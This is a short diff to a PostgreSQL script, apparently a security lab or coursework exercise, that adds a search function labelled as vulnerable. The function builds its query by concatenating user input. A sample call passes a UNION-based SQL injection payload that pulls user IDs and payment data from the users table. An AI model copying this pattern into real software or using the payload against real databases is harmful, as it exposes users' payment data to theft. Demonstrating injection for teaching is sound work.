@@ -44,3 +44,17 @@ $$ LANGUAGE plpgsql;
 SELECT login_safe('bogdan5@test.com', '159789');
 SELECT * from users where email = 'bogdan5@test.com';
 
+-- Vulnerable search function
+CREATE OR REPLACE FUNCTION cauta_produs_new(q text) RETURNS SETOF text AS 
+$func$
+  BEGIN
+    RETURN QUERY EXECUTE
+      'SELECT products.id::text || ''-->'' || products.name::text 
+       FROM products 
+       WHERE name ilike ''%' || q || '%'''
+    USING q;
+  END
+$func$  LANGUAGE plpgsql;
+
+SELECT cauta_produs_new('watch%'' UNION SELECT users.id::text || ''-->'' ||payment::text as payment from users;--''');
+
